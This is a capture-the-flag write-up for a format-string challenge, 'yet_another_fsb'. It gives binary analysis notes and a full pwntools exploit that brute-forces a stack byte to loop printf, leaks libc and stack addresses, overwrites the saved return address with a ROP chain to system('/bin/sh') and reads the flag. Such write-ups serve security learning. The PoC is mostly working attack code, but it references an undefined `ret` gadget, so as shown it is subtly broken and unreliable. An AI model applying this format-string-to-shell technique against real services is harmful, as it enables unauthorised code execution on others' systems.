### I. check mitigation
```D
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x3fe000)
RUNPATH:    b'.'
Stripped:   No
```
### II. IDA
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[270]; // [rsp+0h] [rbp-110h] BYREF
  __int16 flag; // [rsp+10Eh] [rbp-2h]

  flag = 0;
  setup(argc, argv, envp);
  do
  {
    read(0, buf, 255uLL);
    printf(buf);
  }
  while ( flag );
  return 0;
}
```
### III. analyze
- short chall again :(
- partial relro; a loop w condition = 0, and a fmtstr bug inside, no bof
- so my approach is to create a loop and then perform ROPchain or overwrite GOT since we have quite large input size (i choose ROPchain in this case, havent tested overwrite GOT yet)
- bc con `flag = 0`, so we need to both create loop and leak stack/libc if overwrite saved rip in one go
- disas `main` in gdb
```python
Dump of assembler code for function main:
   0x00000000004011a7 <+0>:     push   rbp
   0x00000000004011a8 <+1>:     mov    rbp,rsp
   0x00000000004011ab <+4>:     sub    rsp,0x110
   0x00000000004011b2 <+11>:    mov    WORD PTR [rbp-0x2],0x0
   0x00000000004011b8 <+17>:    mov    eax,0x0
   0x00000000004011bd <+22>:    call   0x401146 <setup>
   0x00000000004011c2 <+27>:    lea    rax,[rbp-0x110]
   0x00000000004011c9 <+34>:    mov    edx,0xff
   0x00000000004011ce <+39>:    mov    rsi,rax
   0x00000000004011d1 <+42>:    mov    edi,0x0
=> 0x00000000004011d6 <+47>:    call   0x401040 <read@plt>
   0x00000000004011db <+52>:    lea    rax,[rbp-0x110]
   0x00000000004011e2 <+59>:    mov    rdi,rax
   0x00000000004011e5 <+62>:    mov    eax,0x0
   0x00000000004011ea <+67>:    call   0x401030 <printf@plt>
   0x00000000004011ef <+72>:    cmp    WORD PTR [rbp-0x2],0x0
   0x00000000004011f4 <+77>:    je     0x4011f8 <main+81>
   0x00000000004011f6 <+79>:    jmp    0x4011c2 <main+27>
   0x00000000004011f8 <+81>:    mov    eax,0x0
   0x00000000004011fd <+86>:    leave
   0x00000000004011fe <+87>:    ret
```
- we cant overwrite flag, as its at `[rbp-0x2]`
- check stack
![[yet_another_fsb_1.png]]
- its also impossible to both leak and write arbitrary in one payload
- *remind: to write arbitrary, we need to know the target addr, since offset will take that value on stack, use it as an addr to write in*
- tbh at first i was stuck at how to loop, but then (after looong time) i realized i could overwrite LSB byte at `rsp - 0x10` to point to flag :/
![[yet_another_fsb_2.png]]
- and bc stack addr is random, so we need to brute force to get correct addr w rate 1/16
![[yet_another_fsb_3.png]]
- now we can perform arbitrary write. i use `%p` to leak as padding too
```python
p = None
while True:
    p = start(attach_gdb=False)
    # overwrite flag to loop
    payload = b'%41$p.%c%8$hhn' + b'A'*2 + p8(0xae)
    try:
        s(payload) 
        output = p.recvuntil(b'A'*2, timeout=0.5)
        if b'.' in output:
            sl(b"TEST")
            if p.recvuntil(b'TEST', timeout=0.5):
                print("successfully")   
                break
            
    except EOFError:
        pass
    p.close()
```
- when we have lots of space to abuse, we can use ROPchain
- after leaking saved rip, libc, i use `fmtstr_payload` from `pwntools` to auto calculate
- and finally, overwrite flag = 0 again to break loop and jump to ROPchain

-> overall, since we have only 1 fmtstr bug w con loop = 0, the path will be:
**create loop by overwrite a stack value and modifying flag value  -> overwrite saved rip w ROPchain -> break loop**
### IV. PoC
```python
#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'yet_another_fsb_patched'
HOST = 'example.com'
PORT = 1337

exe = ELF(exe_path, checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]
context.log_level = 'error'

gdbscript = '''
continue
'''

def start(attach_gdb=False):
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB and attach_gdb:
        gdb.attach(p, gdbscript=gdbscript)
        context.log_level = 'debug'
        # input()
    return p

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)

p = None
while True:
    p = start(attach_gdb=False)
    # overwrite flag to loop
    payload = b'%41$p.%c%8$hhn' + b'A'*2 + p8(0xae)
    try:
        s(payload) 
        output = p.recvuntil(b'A'*2, timeout=0.5)
        if b'.' in output:
            sl(b"TEST")
            if p.recvuntil(b'TEST', timeout=0.5):
                print("successfully")   
                break
            
    except EOFError:
        pass
    p.close()

# log.success(b'outside!')

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    context.log_level = 'debug'

# leak stack and libc
leak = output.split(b'.')[0].split()[-1].decode()
libc.address = int(leak, 16) - 0x25c88
sl(b'%79$p.%27$p')
p.recvuntil(b'AA')
p.recvuntil(b'0x')
stack_leak = p.recvuntil(b'\x2e', drop=True)
stack = int((b'0x' + stack_leak).decode(), 16) - 0x20f72
leak = p.recvuntil(b'\x0a', drop=True)
srip = int(leak.decode(), 16) + 0x40

# print(f'libc: {hex(libc.address)}')
# print(f'stack: {hex(stack)}')
# print(f'saved rip: {hex(srip)}')
# ROP
system = libc.sym['system']
pop_rdi = 0x0fd8c4+libc.address
binsh = next(libc.search(b'/bin/sh'))

offset = 6
payload = fmtstr_payload(offset, {srip: pop_rdi, srip + 0x8: binsh, srip + 0x10: ret, srip + 0x18: system}, write_size='short')
sl(payload)
# log.success(b'payload 1 sent!')
payload = fmtstr_payload(offset, {srip - 0xa : 0x0}, write_size='short')
sl(payload)
# log.success(b'flag = 0')

sl(b'cat flag*')

p.interactive()
```